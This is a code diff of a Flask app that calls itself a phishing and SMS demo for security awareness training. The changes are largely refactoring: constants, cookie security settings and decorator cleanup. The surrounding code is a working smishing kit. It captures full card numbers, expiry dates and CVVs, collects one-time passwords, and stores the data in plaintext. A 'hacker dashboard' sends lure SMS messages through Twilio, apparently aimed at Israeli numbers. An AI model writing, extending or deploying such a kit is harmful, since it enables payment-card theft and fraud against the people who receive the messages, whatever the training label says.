@@ -4,20 +4,38 @@ Combined Phishing & SMS Demo - For Security Awareness Training Only
 Runs phishing demo on / and SMS sender on /sms
 """
 
-from flask import Flask, render_template_string, render_template, request, jsonify, send_file, session, redirect, url_for
+from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for
 from flask_wtf.csrf import CSRFProtect
 from twilio.rest import Client
 from datetime import datetime, timedelta
 from html import escape
 from typing import Optional, Dict, Any, Callable
+from functools import wraps
 import os
 import threading
 import re
 import secrets
 
+# Constants
+MAX_STRING_LENGTH = 255
+MAX_NAME_LENGTH = 100
+MAX_SMS_LENGTH = 1600
+REFERENCE_NUMBER_MODULO = 900000000
+REFERENCE_NUMBER_BASE = 1000000000
+
 app = Flask(__name__)
 # Generate a random secret key for each run since data is in-memory only
 app.secret_key = secrets.token_hex(32)
+
+# Session security configuration
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+
+# Only set Secure flag if behind HTTPS proxy (not for HTTP-only internal communication)
+# This allows NPM/reverse proxy to handle HTTPS while Docker uses HTTP internally
+BEHIND_HTTPS_PROXY = os.getenv('BEHIND_HTTPS_PROXY', 'false').lower() == 'true'
+if BEHIND_HTTPS_PROXY:
+    app.config['SESSION_COOKIE_SECURE'] = True
 
 # Enable CSRF protection
 csrf = CSRFProtect(app)
@@ -45,6 +63,8 @@ if not DEFAULT_SMS_MESSAGE:
     raise ValueError("DEFAULT_SMS_MESSAGE environment variable is required")
 # Convert literal \n to actual newlines for proper text formatting
 DEFAULT_SMS_MESSAGE = DEFAULT_SMS_MESSAGE.replace('\\n', '\n')
+
+DEFAULT_TO_NUMBER = os.getenv('DEFAULT_TO_NUMBER', '+9725')  # Optional, defaults to +9725
 
 # Company name in Hebrew - required from environment
 COMPANY_HEBREW = os.getenv('COMPANY_HEBREW')
@@ -129,7 +149,7 @@ def validate_otp(otp: str) -> bool:
     """Validate OTP (6 digits)"""
     return otp.isdigit() and len(otp) == 6
 
-def sanitize_string(value: str, max_length: int = 255) -> str:
+def sanitize_string(value: str, max_length: int = MAX_STRING_LENGTH) -> str:
     """Sanitize and truncate string input"""
     return escape(value.strip())[:max_length]
 
@@ -139,11 +159,11 @@ def is_authenticated() -> bool:
 
 def require_auth(f: Callable) -> Callable:
     """Decorator to require authentication"""
+    @wraps(f)
     def decorated_function(*args, **kwargs):
         if not is_authenticated():
             return redirect(url_for('login'))
         return f(*args, **kwargs)
-    decorated_function.__name__ = f.__name__
     return decorated_function
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -156,22 +176,11 @@ def login():
 
         if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
             session['authenticated'] = True
-            # Determine where to redirect based on referrer
-            referrer = request.referrer or ''
-            if '/sms' in referrer:
-                return redirect(url_for('sms_sender'))
-            else:
-                return redirect(url_for('hacker_dashboard'))
+            return redirect(url_for('hacker_dashboard'))
         else:
             error = 'Invalid username or password'
 
     return render_template('login.html', error=error)
-
-@app.route('/logout')
-def logout():
-    """Logout user"""
-    session.pop('authenticated', None)
-    return redirect(url_for('login'))
 
 @app.route('/logo.png')
 def serve_logo():
@@ -201,7 +210,7 @@ def submit_card():
         cvv = request.form.get('cvv', '').strip()
 
         # Validate inputs
-        if not card_name or len(card_name) < 3 or len(card_name) > 100:
+        if not card_name or len(card_name) < 3 or len(card_name) > MAX_NAME_LENGTH:
             return "Invalid cardholder name", 400
 
         if not validate_card_number(card_number):
@@ -216,7 +225,7 @@ def submit_card():
         # Sanitize and store inputs
         captured = {
             'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'cardholder_name': sanitize_string(card_name, 100),
+            'cardholder_name': sanitize_string(card_name, MAX_NAME_LENGTH),
             'card_number': card_number,
             'expiry_date': expiry,
             'cvv': cvv
@@ -231,7 +240,7 @@ def submit_card():
 
     return render_template('loading.html')
 
-@app.route('/check_ready', methods=['GET', 'POST'])
+@app.route('/check_ready', methods=['GET'])
 def check_ready():
     """Check if ready to show alert"""
     return jsonify({'ready': get_ready_for_alert()})
@@ -240,7 +249,11 @@ def check_ready():
 @require_auth
 def hacker_dashboard():
     """Hacker control panel with SMS sending"""
-    return render_template('hacker_dashboard.html', default_from=DEFAULT_FROM, default_sms_message=DEFAULT_SMS_MESSAGE)
+    return render_template('hacker_dashboard.html',
+                         default_from=DEFAULT_FROM,
+                         default_to=DEFAULT_TO_NUMBER,
+                         default_sms_message=DEFAULT_SMS_MESSAGE,
+                         max_sms_length=MAX_SMS_LENGTH)
 @app.route('/hacker/data', methods=['GET'])
 @require_auth
 def hacker_data():
@@ -305,13 +318,13 @@ def verify_otp():
                 cvv = re.sub(r'\D', '', card_data.get('cvv', ''))
 
                 if card_number and cvv:
-                    # Calculate: (card_number + cvv) % 900000000 + 1000000000
+                    # Calculate: (card_number + cvv) % REFERENCE_NUMBER_MODULO + REFERENCE_NUMBER_BASE
                     # Result will be a 10-digit number (1000000000-1899999999)
                     # Never starts with 0
                     card_int = int(card_number)
                     cvv_int = int(cvv)
-                    reference_number = str(((card_int + cvv_int) % 900000000) + 1000000000)
-            except (ValueError, ZeroDivisionError):
+                    reference_number = str(((card_int + cvv_int) % REFERENCE_NUMBER_MODULO) + REFERENCE_NUMBER_BASE)
+            except ValueError:
                 reference_number = "N/A"
     except Exception as e:
         # Log error but don't expose details to user
@@ -343,9 +356,9 @@ def send_sms():
         if not validate_phone_number(to_number):
             return jsonify({'error': 'Invalid "to" phone number format. Use E.164 format (e.g., +1234567890)'}), 400
 
-        # Validate message length (Twilio limit is 1600 chars)
-        if len(message_body) > 1600:
-            return jsonify({'error': 'Message too long. Maximum 1600 characters.'}), 400
+        # Validate message length (Twilio limit)
+        if len(message_body) > MAX_SMS_LENGTH:
+            return jsonify({'error': f'Message too long. Maximum {MAX_SMS_LENGTH} characters.'}), 400
 
         if len(message_body) < 1:
             return jsonify({'error': 'Message cannot be empty'}), 400
